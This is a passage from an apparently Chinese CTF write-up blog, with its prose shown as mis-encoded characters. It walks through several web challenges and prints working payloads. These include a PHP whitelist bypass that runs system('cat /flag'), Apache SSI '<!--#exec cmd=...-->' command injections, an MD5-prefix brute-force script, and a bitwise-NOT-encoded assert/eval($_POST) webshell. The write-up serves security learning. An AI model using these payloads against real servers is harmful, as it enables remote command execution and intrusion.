<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span> (strlen($content) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);<br>    &#125; <br></code></pre></td></tr></table></figure>
<p>è¿™ä¸ªç›´æ¥è¿‡ï¼Œä¸€èˆ¬ä¸ä¼šè¶…è¿‡80ä¸ªå­—ç¬¦çš„</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);<br>        &#125;<br>    &#125; <br></code></pre></td></tr></table></figure>
<p>ç»™äº†ä¸ªé»‘åå•å…ˆä¸ç®¡</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">preg<span class="hljs-constructor">_match_all(&#x27;<span class="hljs-operator">/</span>[<span class="hljs-params">a</span>-<span class="hljs-params">zA</span>-Z_\<span class="hljs-params">x7f</span>-\<span class="hljs-params">xff</span>][<span class="hljs-params">a</span>-<span class="hljs-params">zA</span>-Z_0-9\<span class="hljs-params">x7f</span>-\<span class="hljs-params">xff</span>]<span class="hljs-operator">*</span><span class="hljs-operator">/</span>&#x27;, $<span class="hljs-params">content</span>, $<span class="hljs-params">used_funcs</span>)</span>;  <br>    foreach ($used_funcs<span class="hljs-literal">[<span class="hljs-number">0</span>]</span> <span class="hljs-keyword">as</span> $func) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">in</span><span class="hljs-constructor">_array($<span class="hljs-params">func</span>, $<span class="hljs-params">whitelist</span>)</span>) &#123;<br>            die(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);<br>        &#125;<br>    &#125; <br></code></pre></td></tr></table></figure>


<p>åˆç»™äº†ä¸ªç™½åå•ï¼Œifé‡Œçš„æ„æ€ä¸ºå¾—æœ‰ç™½åå•é‡Œçš„å‡½æ•°</p>
<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-built_in">$used</span>_funcs[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-built_in">$func</span><br></code></pre></td></tr></table></figure>
<p>å¤ªæŠ½è±¡äº†ï¼Œå…ˆç†è§£ä¸ºæ£€ç´¢ç™½åå•<br>ä¸€ä¸ªçŸ¥è¯†ç‚¹æ˜¯phpä¸­å¯ä»¥æŠŠå‡½æ•°åé€šè¿‡å­—ç¬¦ä¸²çš„æ–¹å¼ä¼ é€’ç»™ä¸€ä¸ªå˜é‡ï¼Œç„¶åé€šè¿‡æ­¤å˜é‡åŠ¨æ€è°ƒç”¨å‡½æ•°ã€‚<br>ç†æƒ³ä¸­çš„ä¼ å‚æ˜¯</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=(<span class="hljs-variable">$_GET</span>[a])(<span class="hljs-variable">$_GET</span>[b])&amp;a=system&amp;b=<span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure>
<p>ä½†æ˜¯è¿™é‡Œçš„a,béƒ½ä¸æ˜¯ç™½åå•é‡Œçš„ï¼Œè¿™é‡Œæ›¿æ¢ä¸€ä¸‹</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">?c=(<span class="hljs-symbol">$</span>_GET[<span class="hljs-built_in">pi</span>])(<span class="hljs-symbol">$</span>_GET[<span class="hljs-built_in">abs</span>])&amp;<span class="hljs-built_in">pi</span>=<span class="hljs-keyword">system</span>&amp;<span class="hljs-built_in">abs</span>=cat /flag<br></code></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„_GETæ˜¯æ— æ³•è¿›è¡Œç›´æ¥æ›¿æ¢ï¼Œè€Œä¸”[]ä¹Ÿè¢«é»‘åå•è¿‡æ»¤äº†<br>çœ‹çœ‹ç™½åå•æœ‰ä»€ä¹ˆå¯ä»¥ç”¨çš„å‡½æ•°<br><strong>hex2bin()å‡½æ•°</strong><br>hex2bin()å‡½æ•°æŠŠåå…­è¿›åˆ¶å€¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸ºASCiiå­—ç¬¦<br>æŠŠ_GETè½¬åŒ–ä¸ºåå…­è¿›åˆ¶<br><img src="/images/DJQB0VOJ373PVHM.png" srcset="/img/loading.gif" lazyload><br>hex2bin(5f 47 45 54)å°±æ˜¯_GET,ä½†æ˜¯hex2bin()å‡½æ•°ä¹Ÿä¸æ˜¯ç™½åå•é‡Œé¢çš„ï¼Œè€Œä¸”è¿™é‡Œçš„5f 47 45 54ä¹Ÿä¸èƒ½ç›´æ¥å¡«å…¥ï¼Œè¿™é‡Œä¼šè¢«</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">preg<span class="hljs-constructor">_match_all(&#x27;<span class="hljs-operator">/</span>[<span class="hljs-params">a</span>-<span class="hljs-params">zA</span>-Z_\<span class="hljs-params">x7f</span>-\<span class="hljs-params">xff</span>][<span class="hljs-params">a</span>-<span class="hljs-params">zA</span>-Z_0-9\<span class="hljs-params">x7f</span>-\<span class="hljs-params">xff</span>]<span class="hljs-operator">*</span><span class="hljs-operator">/</span>&#x27;, $<span class="hljs-params">content</span>, $<span class="hljs-params">used_funcs</span>)</span>;  <br></code></pre></td></tr></table></figure>
<p>æ¥è¿›è¡Œç™½åå•çš„æ£€æµ‹<br>è¿™é‡Œçš„hex2bin()å‡½æ•°å¯ä»¥é€šè¿‡base_convert()å‡½æ•°æ¥è¿›è¡Œè½¬æ¢<br>base_convert()å‡½æ•°èƒ½å¤Ÿåœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—<br>base_convert(37907361743,10,36)ç­‰äºhex2bin(åˆ«é—®ä¸ºä»€ä¹ˆæ˜¯36è¿›åˆ¶ï¼Œé—®å°±æ˜¯è¿™ä¹ˆè½¬æ¢ä¼šç­‰äºhex2binğŸ˜Š)<br><img src="/images/ZIZM27JBL9XG2SZ5Y.png" srcset="/img/loading.gif" lazyload></p>
<p>é‡Œé¢çš„5f 47 45 54è¦ç”¨dechex()å‡½æ•°å°†10è¿›åˆ¶è½¬æ¢ä¸º16è¿›åˆ¶çš„æ•°<br>dechex(1598506324),1598506324è½¬æ¢ä¸º16è¿›åˆ¶å°±æ˜¯5f 47 45 54<br><img src="/images/QEKBJT3PLILCFXS6L7BG.png" srcset="/img/loading.gif" lazyload></p>
<p>payload</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">/?c=<span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>));(<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">pi</span>&#125;((<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">abs</span>&#125;)&amp;<span class="hljs-built_in">pi</span>=<span class="hljs-keyword">system</span>&amp;<span class="hljs-built_in">abs</span>=cat /flag<br></code></pre></td></tr></table></figure>
<p><img src="/images/B5YT537OKAX6WR7R5O.png" srcset="/img/loading.gif" lazyload><br>flagå‡ºæ¥äº†ï¼Œå†è¯¦ç»†åˆ†æä¸‹<br>ä»å‰å¾€å</p>
<p>base_convert(37907361743,10,36)-&gt;hex2bin</p>
<p>dechex(1598506324)-&gt;5f 47 45 54</p>
<p>$pi&#x3D;hex2bin(5f 47 45 54)-&gt;$pi&#x3D;_GET</p>
<p>ç®¡é“ç¬¦;è¿æ¥</p>
<p>($$pi){pi}(($$pi){abs})</p>
<p>($_GET){pi}(($_GET){abs})</p>
<p>è¿™ä¸ªè¡¨è¾¾å¼å®é™…ä¸Šä¼šå°è¯•æ‰§è¡Œ$_GET(pi)($_GET(abs))</p>
<p>æ‰€ä»¥æ­¤æ—¶cçš„å€¼ä¸ºc&#x3D;_GET$_GET(pi)($_GET(abs))</p>
<p>åé¢æœ‰å¯¹piå’Œabsèµ‹å€¼ï¼Œå¸¦å…¥</p>
<p>c&#x3D;system(cat &#x2F;flag)</p>
<h2 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h2><p>å¥½ç®€å•ï¼Œå°±è—åœ¨æºä»£ç é‡Œ<br><img src="/images/IB0WVFS4XJ9N847G.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><p>å¹¶ä¸æ˜¯sqlæ³¨å…¥å’Œxss<br>ä¸€å®šè¦æ³¨æ„é¢˜ç›®ç»™çš„æç¤º<br>è¾“å…¥usernameå’Œpasswordï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ä»¥GETæ–¹å¼å‘é€çš„<br>è·å–å…³é”®è¯cookie<br>å°è¯•ç”¨cookieç™»å½•<br><img src="/images/DAMXIM6X4N91NEI.png" srcset="/img/loading.gif" lazyload><br>&amp;password&#x3D;123å¤šä½™äº†<br>å»æ‰è¯•è¯•<br><img src="/images/FZ806UV2QR1V9VG2.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>sqlæ³¨ä¸å‡ºæ¥ï¼ŒæŸ¥çœ‹æºç ä¹Ÿæ²¡æœ‰ä»€ä¹ˆæœ‰æ•ˆçš„ä¿¡æ¯<br>ç”¨dirsearchæ‰«ä¸€æ‰«<br>æ²¡æœ‰æ‰«å‡ºä»€ä¹ˆä¸œè¥¿ï¼Œå¯èƒ½æ˜¯æˆ‘çš„dirsearchå¤ªä½çº§äº†<br>çœ‹äº†ä¸‹åˆ«äººçš„åšå®¢ï¼Œdirsearchæ‰«å‡ºäº†index.php.swp<br>æ‰¾åˆ°äº†æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-title function_ invoke__">ob_start</span>();<br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_hash</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;<br>		<span class="hljs-variable">$random</span> = <span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)];<span class="hljs-comment">//Random 5 times</span><br>		<span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-variable">$random</span>;<br>		<span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$content</span>); <br>	&#125;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br>	***<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;&#x27;</span> )<br>    &#123;<br>        <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;6d0bc1&#x27;</span>;<br>        <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$admin</span> == <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;<br>            <span class="hljs-variable">$file_shtml</span> = <span class="hljs-string">&quot;public/&quot;</span>.<span class="hljs-title function_ invoke__">get_hash</span>().<span class="hljs-string">&quot;.shtml&quot;</span>;<br>            <span class="hljs-variable">$shtml</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$file_shtml</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to open file!&quot;</span>);<br>            <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/h1&gt;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">			***&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$shtml</span>,<span class="hljs-variable">$text</span>);<br>            <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$shtml</span>);<br>            ***<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[!] Header  error ...&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;<br>            <br>    &#125;<span class="hljs-keyword">else</span><br>    &#123;<br>	***<br>    &#125;<br>	***<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$admin</span> == <span class="hljs-built_in">substr</span>(<span class="hljs-built_in">md5</span>($_POST<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;password&#x27;</span>]</span>),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>))<br></code></pre></td></tr></table></figure>
<p>æ²¡æœ‰ç»•è¿‡æ–¹æ³•ï¼Œå†™ä¸€ä¸ªpythonè„šæœ¬</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scss">import hashlib<br><br>def <span class="hljs-built_in">crack</span>(pre):<br>    for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">9999999</span>):<br>        if (hashlib.<span class="hljs-built_in">md5</span>(<span class="hljs-built_in">str</span>(i).<span class="hljs-built_in">encode</span>(<span class="hljs-string">&quot;UTF-8&quot;</span>)).<span class="hljs-built_in">hexdigest</span>())[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == <span class="hljs-built_in">str</span>(pre):<br>            <span class="hljs-built_in">print</span>(i)<br>            break<br><br><br><span class="hljs-built_in">crack</span>(<span class="hljs-string">&quot;6d0bc1&quot;</span>)<br></code></pre></td></tr></table></figure>
<p>å¾—å‡ºä¸º2020666<br>è¾“å…¥</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">password</span>=<span class="hljs-number">2020666</span>&amp;username=admin<br></code></pre></td></tr></table></figure>

<p>é¡µé¢å‘å‡ºè­¦å‘Šè¯´æ˜å·²ç»é€šè¿‡</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl">$file_shtml = <span class="hljs-string">&quot;public/&quot;</span>.get_hash().<span class="hljs-string">&quot;.shtml&quot;</span>;<br>          $shtml = fopen($file_shtml, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to open file!&quot;</span>);<br>          $text = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">          ***</span><br><span class="hljs-string">          ***</span><br><span class="hljs-string">          &lt;h1&gt;Hello,&#x27;</span>.$_POST[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/h1&gt;</span><br><span class="hljs-string">          ***</span><br><span class="hljs-string">	***&#x27;</span>;<br>          fwrite($shtml,$text);<br>          fclose($shtml);<br></code></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„get_hash()å€¼æ˜¯ä¸å¯èƒ½æ±‚å‡ºæ¥çš„ï¼Œåªèƒ½æ‰¾å‡ºæ¥ï¼Œå†åœ¨é¡µé¢ä¸Šæ‰¾æ‰¾<br><img src="/images/MUW7PLXTC8KCQ5YHP.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/images/NLRFZRXO510E.png" srcset="/img/loading.gif" lazyload><br>çœ‹åˆ°client ipå°±æƒ³xffä¸€ä¸‹ï¼Œå¯æƒœxä¸äº†<br>è¿™é¢˜çš„æ€è·¯æ˜¯åˆ©ç”¨â€Apache SSIè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´â€<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuzly/p/11226439.html">Apache SSI è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°</a><br>é¡µé¢å›æ˜¾äº†usernameï¼Œpasswordä¸èƒ½åŠ¨<br>çœ‹åˆ°.shtmlåç¼€ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ä¸€ä¸‹<br>å½“ç›®æ ‡æœåŠ¡å™¨å¼€å¯äº†SSIä¸CGIæ”¯æŒ,æˆ‘ä»¬å°±å¯ä»¥ä¸Šä¼ shtml,åˆ©ç”¨<code>&lt;!--#exec cmd=&quot;id&quot; --&gt;</code>è¯­æ³•æ‰§è¡Œå‘½ä»¤ã€‚<br>payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=<span class="hljs-comment">&lt;!--#exec cmd=&quot;ls&quot; --&gt;</span>&amp;password=2020666<br></code></pre></td></tr></table></figure>
<p>è¿›å…¥æ–°ç”Ÿæˆçš„urlæŸ¥çœ‹<br><img src="/images/ZJ4P7M6GGO.png" srcset="/img/loading.gif" lazyload><br>è¿™ä¹ˆå¤šçš„é“¾æ¥ï¼Œè¦è¯•åˆ°çŒ´å¹´é©¬æœˆ<br>å»æ ¹ç›®å½•çœ‹çœ‹<br>payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=<span class="hljs-comment">&lt;!--#exec cmd=&quot;ls /&quot; --&gt;</span>&amp;password=2020666<br></code></pre></td></tr></table></figure>
<p><img src="/images/EP83OM9ZY8K5GK.png" srcset="/img/loading.gif" lazyload><br>æ²¡æœ‰ï¼Œé‚£ä¸Šä¸€çº§çœ‹çœ‹<br>payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=<span class="hljs-comment">&lt;!--#exec cmd=&quot;ls ../&quot; --&gt;</span>&amp;password=2020666<br></code></pre></td></tr></table></figure>
<p><img src="/images/MHS82ETVEKT1RC6.png" srcset="/img/loading.gif" lazyload><br>çœ‹åˆ°ä½ç½®ç›´æ¥cat<br>payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=<span class="hljs-comment">&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;</span>&amp;password=2020666<br></code></pre></td></tr></table></figure>
<p><img src="/images/CVZTGYF5UOP7U2YGKY.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</h2><p>è¿™é¢˜æºç éå¸¸ç®€å•ï¼Œå°±æ˜¯è¦ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä¸èƒ½ä½¿ç”¨æ¢è¡Œç¬¦æ¥ç»•è¿‡ï¼Œè¦ä½¿ç”¨phpå¼‚æˆ–æ“ä½œå³å¯ç»•è¿‡æˆ–é€šè¿‡urlç¼–ç ç»•è¿‡<br>ä½†æ˜¯ã€‚ã€‚ã€‚<br>è¿˜æ˜¯æ²¡æœ‰è¿™ä¹ˆç®€å•ï¼Œæœ¬é¢˜ä¸»è¦å†…å®¹æ˜¯disable_functionç¦ç”¨äº†å¤§é‡çš„å‡½æ•°å¯¼è‡´shellä¸Šä¼ æˆåŠŸä½†æ— æ³•ä½¿ç”¨çš„æƒ…å†µå‡ºç°ä½¿å¾—éš¾åº¦å¤§å¤§æé«˜<br>å…ˆå–åç»•è¿‡<br>å–åæ“ä½œå¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;phpinfo&#x27;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$a</span>);<br><br>&gt;<br>payload<br>?code=(~%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">99</span>%<span class="hljs-number">90</span>)();<br></code></pre></td></tr></table></figure>
<p>æŸ¥çœ‹phpinfo</p>
<p>æ“ä¸€ä¸ªshell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;assert&#x27;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-string">&#x27;(eval($_POST[a]))&#x27;</span>;<br><span class="hljs-variable">$d</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$d</span>;<br><span class="hljs-meta">?&gt;</span><br>åœ¨PHPä¸­ï¼Œ~ æ˜¯æŒ‰ä½å–åè¿ç®—ç¬¦ï¼Œè€Œç”¨urlç¼–ç æ˜¯é¿å…ä¸å¯è§å­—ç¬¦<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;D&quot;</span>^<span class="hljs-string">&quot;C&quot;</span>                  å¼‚æˆ–<br><span class="hljs-comment">//$a=&#x27; </span><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&quot;B&quot;</span>);        å–å<br><span class="hljs-comment">//$a=%BB                ç”±äºå–åç»“æœæ˜¯ä¸€ä¸ªä¸å¯è§çš„å­—ç¬¦ã€‚æ‰€ä»¥æˆ‘ä»¬é€šè¿‡URLç¼–ç è¾“å‡ºã€‚æµè§ˆå™¨ä¼šè‡ªåŠ¨è§£ç ã€‚~&quot;B&quot;=~%BB</span><br><span class="hljs-comment">//ä¸å¤ªæ˜ç™½ä¸ºä»€ä¹ˆè¦ç”¨assert</span><br></code></pre></td></tr></table></figure>
